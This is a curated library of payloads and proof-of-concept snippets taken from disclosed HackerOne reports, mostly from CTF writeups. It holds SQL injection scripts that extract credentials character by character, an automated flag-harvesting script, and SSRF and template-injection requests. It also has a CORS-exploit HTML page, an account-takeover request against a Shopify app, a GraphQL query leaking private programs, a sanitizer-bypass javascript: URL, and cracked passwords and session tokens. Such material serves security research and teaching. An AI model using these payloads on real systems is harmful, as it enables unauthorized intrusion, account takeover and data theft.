# Other / Uncategorized Findings  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1266828](https://hackerone.com/reports/1266828)  -  Staff who only have apps and channels permission can do a takeover account at the wholesale store (Bypass get invitation link)
*medium, $1,600*

```http
POST /admin/shops/19596/accounts/{ID ACCOUNT}/send_invite HTTP/2
Host: wholesale.shopifyapps.com
Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _g…
Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518?hmac=adf5598e786b95e73d4c6637a457ea38a01f7fb99a14b480c7fbe9c22e53ef80&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529478
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://wholesale.shopifyapps.com

authenticity_token=qHWmHVuCLbQOWT2cCElOvv%2BAQoHz4AvsMdVzW8zkjiTemE5jx2q7IdeX9nfSnVHA45fbdXVx4oo%2FYhU%2FpnnW8Q%3D%3D
```

## 2. [#1266828](https://hackerone.com/reports/1266828)  -  Staff who only have apps and channels permission can do a takeover account at the wholesale store (Bypass get invitation link)
*medium, $1,600*

```http
POST /admin/shops/19596/accounts/{ID ACCOUNT} /invite_links HTTP/2
Host: wholesale.shopifyapps.com
Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _g…
Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182510?hmac=a916ff51bbbb7f51d6ac927131c0b28b08f54458a1062284fdbabd823d43c2f1&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529537
X-Csrf-Token: 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==
X-Requested-With: XMLHttpRequest
Origin: https://wholesale.shopifyapps.com
Content-Length: 0
```

## 3. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
#!/bin/bash

YELLOW="\e[93m"
NORMAL="\e[39m"

OP=`curl -sgi "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x' UNION SELECT \"' UNION SELECT null,null,'$1'--+\",null,null--+" | grep -Eoi "src=\"\/r[^+]+\"" | cut -d '"' -f 2`
OP_TWO=`curl -GkLs "https://hackyholidays.h1ctf.com$OP"`
echo -e "${YELLOW}[$1]${NORMAL} : $OP_TWO"
```

## 4. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```bash
# chr function to get ascii chars
chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

while true
do
        for x in {48..57} {97..122};
        do
                letter=$(chr $x);
                #letter=$(urlencode "$letter");
                new="$dis";
                url=$(curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+--" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | grep -v 'DM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMT' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/');

                curl "$url" > output 2> /dev/null;
                if cat output | grep 'Invalid content type detected' > /dev/null; then dis="${dis}${letter}"; echo -ne "\r$dis"; fi
        done
done
```

## 5. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```http
POST /signup-manager/ HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Content-Length: 122 
Origin: https://hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded 
Referer: https://hackyholidays.h1ctf.com/signup-manager/ 

action=signup&username=BYYYYYYYYYYYYYY&password=BYYYYYYYYYYYYYY&age=1e5&firstname=AYYYYYYYYYYYYYY&lastname=AYYYYYYYYYYYYYY
```

## 6. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```http
POST /signup-manager/ HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Content-Length: 122 
Origin: https://hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded
```

## 7. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```bash
#!/bin/bash
# find_endpoints.sh : Script for finding the valid endpoint
# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}

word=$1

url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/${word}'--%20-%22,2,3--%20-"

# extracting image path
path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

img_url="https://hackyholidays.h1ctf.com${path}"

if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 404" ]]; then 
        echo "${word}:${img_url}"
fi
```

## 8. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```bash
#!/bin/bash
# find_endpoints.sh : Script for finding the valid endpoint
# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}

url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/?${word}=anything'--%20-%22,2,3--%20-"

# extracting image path
path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

img_url="https://hackyholidays.h1ctf.com${path}"

if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 400" ]]; then 
        echo "${word}:${img_url}"
fi
```

## 9. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 125
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 10. [#712321](https://hackerone.com/reports/712321)  -  Disable xmlrpc.php file
*low*

```http
POST /xmlrpc.php HTTP/1.1
Host: www.topechelon.com
Content-Length: 91

<methodCall>
```

## 11. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```bash
#!/bin/bash
# find_credentials.sh: Script for finding the valid credentials

charset=$(echo {a..z} {A..Z} {0..9})

# Extracting Username
ct=0
found=""
res=""
echo "[*] Finding Username..."
while [[ $ct -le 36 ]]; do
        ct=0
        for char in $charset
        do
                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/user?username=${found}${char}%'--%20-%22,2,3--%20-"

                # extracting image path
                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

                img_url="https://hackyholidays.h1ctf.com${path}"
                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
                        echo ${char}
                        res=$res$char
                        found=${found}${char}
                        break 1
                fi
                ct=$(( ct+1 ))
        done
done
echo "Username: ${res}"

# Extracting Password
ct=0
found="s"
echo "[*] Finding Password..."
# … truncated …
```

## 12. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 100

preview_markup=Hello {{name}}....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}"
```

## 13. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

## 14. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9

'''
```

## 15. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 105
```

## 16. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```ajax
<script>
    $('.thelist').on("click", "a", function(){
        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
            alert( resp.rating );
        }).fail(function(){
            alert('Request failed');
        });
    });
    var page = 0;
    $('.loadmore').click( function(){
        page++;
        $.getJSON('/people-rater/page/' + page, function(resp){
            if( resp.results.length < 5 ){
                $('.loadmore').hide();
            }
            $.each( resp.results, function(k,v){
                $('.thelist').append('<div style="margin-bottom:15px"><a class="btn btn-info" data-id="' + v.id + '">' + v.name + '</a></div>')
            });
        });
    });
    $('.loadmore').trigger('click');
</script>
```

## 17. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
Endpoint `user` seems interesting tried to find valid parameters and got 2 valid parameters.(Filtering based on response code if 400 then invalid parameter else valid parameter)
Query used `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?parameter=abc' -- -",'1',1-- -`
```

## 18. [#737578](https://hackerone.com/reports/737578)  -  Redirection through referer tag
*low*

```http
POST /de/subscribe/ HTTP/1.1
Host: stripo.email
X-Forwarded-Host: https://www.google.com
Referer: https://www.google.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Cookie: XSRF-TOKEN=eyJpdiI6IjM3U1BCZzdtbENpWEc5YWNGXC81MkV3PT0iLCJ2YWx1ZSI6Ik10cWlqTGJJN0pHSitDYlhQe…

subscribe-email=winter@example.com&_token=WFCpqT3ZTAXA2fdBfdLAqsPIIVNv9bRgZBYUfsCh&source=LANDING
```

## 19. [#1276992](https://hackerone.com/reports/1276992)  -  Disclosure handle private program with external link
*medium, $2,500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 168
content-type: application/json
Origin: https://hackerone.com
Cookie: your_cookie

{"query":"{teams(last:100,where:{_and:[{roles:is_has_published_external_program},{roles:is_private}]}){total_count,nodes{_id,handle,state,participants{total_count}}}}"}
```

## 20. [#1276992](https://hackerone.com/reports/1276992)  -  Disclosure handle private program with external link
*medium, $2,500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 168
content-type: application/json
Origin: https://hackerone.com
```

## 21. [#777241](https://hackerone.com/reports/777241)  -  [h1-415 2020] Multiple chained vulnerabilities lead to leaking secret document
*critical*

```js
$("#chat-form").submit(async function(e) {
    e.preventDefault();
    var t = $("#chat-textarea").val();
    if ("finish" !== t.toLowerCase()
        && "quit" !== t.toLowerCase()
    ) {
        $("#chat-textarea").val("");
        $("#chat-button").attr("disabled", !0);
        $("#chat-div").append(decodeURIComponent('<h3><span class="badge badge-primary">' + t + "</span></h3>"));
        window.scrollTo(0, document.body.scrollHeight);
        if (t.length > 0) {
            var a = await fetch("/support/chat?message=" + t);
            showTypedMessages([(await a.json()).response])
        }
        $("#chat-button").attr("disabled", !1);
        $("#chat-textarea").focus();
    } else showReviewModal()
});
```

## 22. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=f72a37dc583456150a13bd8b3b19433d&challenge_answer=letmein
```

## 23. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```

## 24. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: https://staff.bountypay.h1ctf.com
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NV…

profile_name=sandra&profile_avatar=avatar2
```

## 25. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 26. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 27. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
And server created auth token for us to perform SSRF.
When I entered something which does not exist on website like above example, I got response as
{F1132665}
Indicating it is performing request and 404 for not found, so by this way we can enumerate valid api endpoints and also when I sent something which is valid like `../api/` page I got response as
{F1132666}
So a blind SSRF, All we have to do based on response codes as described on [api][31] page.
[31]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api      "api"
So created a python script which is attached to do all these, thanks again to `MrKn0w1t4ll` here
{F1132643}
Got 2 valid endpoints( Filtering based on response code if 404 then invalid else valid)
Query used `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/endpoint' -- -",'1',1-- -`
```

## 28. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
Damn, another SQL [like][32] query injection in username and password parameters.
[32]: https://github.blog/2015-11-03-like-injection/      "like"
We can extract bit by bit by injecting `character%` and filtering results based on response codes if 204 then no data found and does not start with the specified character and if response as `invalid content type detected` then some data is found and it starts with specified character.
Using query `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?username=character%' -- -",'1',1-- -`
So I started checking each character from python's `string.printable` string one by one and got 1st chacater at g and kept repeating like `g%, gr%, gri%`, ...
Got valid username as `grinchadmin` and did same for passwor,
Using query `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?password=character%' -- -",'1',1-- -`
Got password as `s4ant4sucks`,  logged in on [attack-box][32] and got the flag.
[32]: https://hackyholidays.h1ctf.com/attack-box/login     "attack-box"

Challenge 12: Grinch Network Attack Server
-------------------------------------------
Using credentials from previous challenge, logged into [attack-box][32]
{F1132722}
When clicked `attack` I got the follpwing page,
{F1132727}
On viewing source code of main page, got this.
# … truncated …
```

## 29. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```http
GET /?next=java%26%2313%3Bscript%3Adocument.title%3D%27owned%27%3Bdocument.body.innerText%3D%27EXECUTED%27%3Bvoid(0) HTTP/1.1
Host: 127.0.0.1:9442
```

## 30. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
We need to be admin to read the entries in the admin section therefore we need to get grinch's plaintext password.

The password looks like MD5. Luckily I was lazy enough to first search if the hashes were already cracked by googling them. `max` hash gave me no result, but I found out that `BahHumbug` is the plaintext password of the user `grinch`. 

{F1138946}

Not even `rockyou.txt` contains the hash, it would have taken me forever to crack the hash on my own. Due to that, I'm still not sure if I missed a step that would have allowed to bypass the login by reviewing the `forum` sourcecode - looking shortly through it did not reveal any obvious bugs. On the other hand, if bruteforcing the password with a wordlist was possible, the `phpmyadmin` step could be bypassed altogether, maybe a hash that usually is not present in a common wordlist was used intentionally... 

Anyway, I successfully used `grinch:BahHumbug` to login to the forum and was able read the post in the admin area under the category `Secret Plans` which contains the flag, `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`:

{F1138947}

## Flag 9 - Evil Quiz

**App description**: "Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!"

The grinch wants us to take a quiz. In order to complete a quiz, one must specify a username and answer the following 3 questions:
* Do you like Christmas?
* Are you holly and jolly?
* Do you like presents?

After submitting the quiz, a score is printed and the number of other players with the same name gets shown.

After trying some input manipulation, I found out that the name input at the beginning of the quiz is vulnerable to SQL injection and we can see the result of a boolean query by analyzing the number of players displayed at the end of the game: when using `invalidplayername' or if(1=0, 1, 0); -- ` as username, zero players are selected from the database, therefore the count of other players equals zero, whereas when adding `invalidplayername' or if(1=0, 1, 0); -- `, all players are selected and the count is greater than zero.

Unfortunately, we need to submit multiple requests to get a result. Instead of trying to find out how to use SQLMap for that task / whether that is possible at all, I used the following Python script for getting the credentials:
# … truncated …
```

## 31. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```bash
echo -e "NOTE: This script uses: curl, wget, google-chrome headless, unzip, grep and sed. if any of this is missing, the script might not run well\n";

echo -e "[*] Getting all flags...\n";

## Flag 1

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/robots.txt' | grep "flag[^ ]*" -o | sed 's/^/Flag 1\: /';

## Flag 2 - Needs chrome headless browser.

google-chrome --headless --disable-gpu --dump-dom https://hackyholidays.h1ctf.com/s3cr3t-ar3a --no-sandbox | egrep -o "flag\{[a-zA-Z0-9\-]*}" | sed 's/^/Flag 2\: /';

## Flag 3

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0g' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 3\: /';

## Flag 4

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 4\: /';

## Flag 5 - this one is a bit hard. uses 'unzip' to unzip the file, reads it and then deletes everything.

wget 'https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip' 2> /dev/null;
unzip -P "hahahaha" my_secure_files_not_for_you.zip &> /dev/null;
cat flag.txt | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 5\: /';
rm flag.txt xxx.png my_secure_files_not_for_you.zip;

## Flag 6

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' $'https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 6\: /';

## Flag 7

curl -X POST -s -k -d "preview_markup=Hello+%7B%7Bflag%7D%7D&preview_data=%7B%22flag%22%3A%22%7B%7Btemplate:38dhs_admins_only_header.html%7D%7D%22%7D" "https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview" | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 7\: /';

# … truncated …
```

## 32. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 33. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello{{name}}+....+whatever&preview_data={"name":"Alice","email":"alice@test.com"}
```

## 34. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 35. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```bash
while read line; do
        curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/${line}%27+--+-%22,%2712%27,1--+-" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/' | anew valid-endpoints > /dev/null;
done < api.txt

while read line; do
        curl -s -k "${line}" > output;
        if cat output | grep 'Invalid content type detected' > /dev/null; then
                echo $line;
        fi
done < valid-endpoints
```

## 36. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded

preview_markup=Hello+{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

## 37. [#772744](https://hackerone.com/reports/772744)  -  Unsafe cors sharing of admin users
*medium*

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://lonestarcell.com/wp-json/wp/v2/users/", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

## 38. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
GET / HTTP/1.1
Host: app.bountypay.h1ctf.com
Referer: https://bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

## 39. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 40. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NV…
```

## 41. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjM= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NV…
```

## 42. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 105
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded

action=signup&username=w31rdtest&password=password&age=1e5&firstname=loadsofys&lastname=abcdefgabcdeYYY
```

## 43. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 100
```

## 44. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 105
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 45. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

action=signup&username=lumi&password=nougatzzz&age=1e3&firstname=lumi&lastname=AAAAAAAAAAAAAAY
```

## 46. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 101
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=c4ca4238a0b923820dcc509a6f75849b&challenge_answer=1
```

## 47. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
POST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

staff_id=STF:84DJKEIP38
```

## 48. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3&staff_name=1
```

## 49. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

username=brian.oliver&password=V7h0inzX&challenge_answer=AAAAAAAAAA&challenge=16c52c6e8326c071da771e66dc6e9e57
```

## 50. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 06 Jun 2020 12:46:14 GMT
Content-Type: application/json
Connection: close
Content-Length: 205

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=01&year=2020","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
```

## 51. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 23:33:27 GMT
Content-Type: application/json
Connection: close
Content-Length: 104

[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

## 52. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
POST /api/staff HTTP/1.1
Content-Length: 25
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

staff_id=STF%3a8FJ3KFISL3
```

